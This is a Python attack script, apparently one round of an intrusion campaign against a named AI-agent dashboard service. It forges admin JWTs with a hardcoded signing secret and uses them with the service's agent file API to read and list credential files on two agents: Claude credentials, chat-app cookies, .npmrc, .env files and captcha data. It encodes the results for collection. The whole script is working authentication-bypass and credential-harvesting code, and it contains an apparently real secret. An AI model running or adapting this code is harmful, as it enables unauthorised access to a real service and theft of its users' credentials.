#!/usr/bin/env python3
# i28934 round5: files-RPC carve-out harvest of /home/lumii credentials
import os,sys,json,time,base64,hmac,hashlib,subprocess,re
HOST="dashboard.lumiiai.cn"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET="w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
T0=time.time()
def el(): return int(time.time()-T0)
def _b64(s): return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v):
    s=v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str)
    print("R:%s:%s"%(k,_b64(s)),flush=True)
def curl(args,timeout=40):
    try:
        r=subprocess.run(["curl","-s","-k","-m",str(timeout)]+args,capture_output=True,timeout=timeout+15)
        return r.returncode,r.stdout,r.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def call(path,method="GET",body=None,timeout=40,maxlen=120000,cookie=None):
    url="https://%s%s"%(HOST,path)
    args=["--http2","-A",UA,"-H","Accept: application/json, text/plain, */*","-w","\n__CODE__%{http_code}"]
    if cookie: args+=["-H","Cookie: session="+cookie]
    if body is not None: args+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": args+=["-X",method]
    args+=[url]
    rc,out,err=curl(args,timeout=timeout)
    txt=out.decode("utf-8","replace");code="";i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3];txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"len":len(txt)}
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def forge(payload):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=b64u(json.dumps(payload,separators=(",",":")))
    sig=b64u(hmac.new(JWT_SECRET.encode(),(h+"."+p).encode(),hashlib.sha256).digest())
    return h+"."+p+"."+sig
def fil(aid,action,path,cookie,tag,maxlen=7000):
    r=call("/api/agents/%s/files?action=%s&path=%s"%(aid,action,path),cookie=cookie,timeout=45,maxlen=maxlen)
    R(tag, {"code":r["code"],"body":r["body"][:maxlen],"len":r["len"]})

def run(aid,owner,cs,label,items):
    tok=forge({"userId":owner,"email":"probe@x","customer":cs,"role":"admin"})
    for (act,p) in items:
        safe=re.sub(r'\W','_',p)
        fil(aid,act,p,tok,"%s_%s_%s"%(label,act,safe))

# tianyue3 agent
run("agent-0cf829f4","4b4f439e-74f7-11f1-ac43-525400595be1","tianyue","T3",[
  ("read","/home/lumii/.decart.env"),
  ("read","/home/lumii/gitea-deploy-guide.md"),
  ("read","/home/lumii/feishu_cookies.txt"),
  ("read","/home/lumii/feishu_c2.txt"),
  ("read","/home/lumii/feishu_c3.txt"),
  ("read","/home/lumii/captcha_passwordReq.txt"),
  ("read","/home/lumii/captcha_verify.txt"),
  ("read","/home/lumii/.claude/.credentials.json"),
  ("read","/home/lumii/.claude.json"),
  ("read","/home/lumii/.claude/settings.json"),
  ("read","/home/lumii/.npmrc"),
  ("read","/home/lumii/.gitconfig"),
  ("list","/home/lumii/.claude"),
  ("list","/home/lumii/.gstack"),
  ("list","/home/lumii/.npm"),
  ("list","/home/lumii/attachments"),
  ("list","/home/lumii/desk"),
  ("list","/home/lumii/herald-review"),
])
# intelora1 agent
run("agent-10718fda","4509f57e-4909-11f1-ac43-525400595be1","plexus","I1",[
  ("read","/home/lumii/aiagcore/.ids_part"),
  ("list","/home/lumii/aiagcore"),
  ("list","/home/lumii/aiagcore/assets"),
  ("list","/home/lumii/.lumii"),
  ("read","/home/lumii/.decart.env"),
])
R("done",{"elapsed":el()})
